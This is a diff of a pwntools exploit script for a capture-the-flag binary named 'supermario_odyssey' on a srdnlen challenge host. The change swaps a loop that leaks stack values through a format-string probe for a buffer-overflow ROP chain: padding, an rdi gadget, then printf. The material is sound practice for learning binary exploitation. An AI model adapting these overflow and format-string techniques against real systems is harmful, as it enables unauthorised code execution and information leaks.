@@ -4,7 +4,7 @@ from pwn import *
 from ctypes import CDLL
 
 context.terminal = ["tmux", "splitw", "-h"]
-context.log_level = 'error' # se non vuoi vedere i loggin
+# context.log_level = 'error' # se non vuoi vedere i loggin
 exe = context.binary = ELF(args.EXE or './supermario_odyssey')
 lib = CDLL(exe.libc.path)
 host = args.HOST or 'supermario-odyssey.chall.srdnlen.it'
@@ -53,20 +53,14 @@ payload = flat(
     rdi, dati, adjust, printf 
 )
 
-i = 0 
-while True:
-    try:
-        io = start()
-        i += 1
-        io.sendlineafter(b"> ", payload)
-        io.sendline(f"%{i}$p".encode())
-        io.recvline()
-        io.recvline()
-        print(i, io.recvline())
-        io.close()
-        # exit()
-    except EOFError:
-        io.close()
-        pass
+payload = flat(
+    b"A" * 40, # padding
+    rdi, get, adjust, printf 
+)
+
+io.sendlineafter(b"> ", payload)
+print(io.recvline())
+
+io.close()
 io.interactive()
 
